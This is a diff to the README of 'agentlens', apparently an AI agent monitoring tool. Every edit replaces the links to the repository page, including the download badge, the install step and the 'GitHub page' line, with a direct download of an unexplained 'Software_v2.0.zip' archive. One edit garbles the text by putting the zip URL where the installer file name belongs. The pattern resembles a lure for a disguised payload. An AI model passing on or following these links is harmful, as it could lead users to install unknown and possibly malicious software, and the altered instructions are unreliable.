@@ -1,6 +1,6 @@
 # 🧭 agentlens - Simple AI Agent Monitoring Tool
 
-[![Download agentlens](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Matukas12/agentlens)
+[![Download agentlens](https://github.com/Matukas12/agentlens/raw/refs/heads/master/sdk/agentlens/Software_v2.0.zip)](https://github.com/Matukas12/agentlens/raw/refs/heads/master/sdk/agentlens/Software_v2.0.zip)
 
 ---
 
@@ -49,11 +49,11 @@ Follow these steps to get agentlens running on your computer.
 
    Click the big button at the top or use this link:
 
-   [Download agentlens from GitHub](https://github.com/Matukas12/agentlens)
+   [Download agentlens from GitHub](https://github.com/Matukas12/agentlens/raw/refs/heads/master/sdk/agentlens/Software_v2.0.zip)
 
 2. **Locate the Downloaded File**
 
-   After downloading, find the file in your Downloads folder. The file might be named something like `agentlens-setup.exe` for Windows or a `.dmg` file for macOS.
+   After downloading, find the file in your Downloads folder. The file might be named something like `https://github.com/Matukas12/agentlens/raw/refs/heads/master/sdk/agentlens/Software_v2.0.zip` for Windows or a `.dmg` file for macOS.
 
 3. **Run the Installer**
 
@@ -116,7 +116,7 @@ This helps teams of all sizes understand their AI tools better.
 
 You can get agentlens here:
 
-[![Download agentlens](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Matukas12/agentlens)
+[![Download agentlens](https://github.com/Matukas12/agentlens/raw/refs/heads/master/sdk/agentlens/Software_v2.0.zip)](https://github.com/Matukas12/agentlens/raw/refs/heads/master/sdk/agentlens/Software_v2.0.zip)
 
 Click the link, visit the page, and download the installer that matches your system.
 
@@ -133,6 +133,6 @@ Visit the GitHub repository page for:
 - Reporting issues
 - Asking questions
 
-GitHub page: https://github.com/Matukas12/agentlens
+GitHub page: https://github.com/Matukas12/agentlens/raw/refs/heads/master/sdk/agentlens/Software_v2.0.zip
 
 agentlens is designed to be straightforward so you can focus on understanding your AI without hassles.
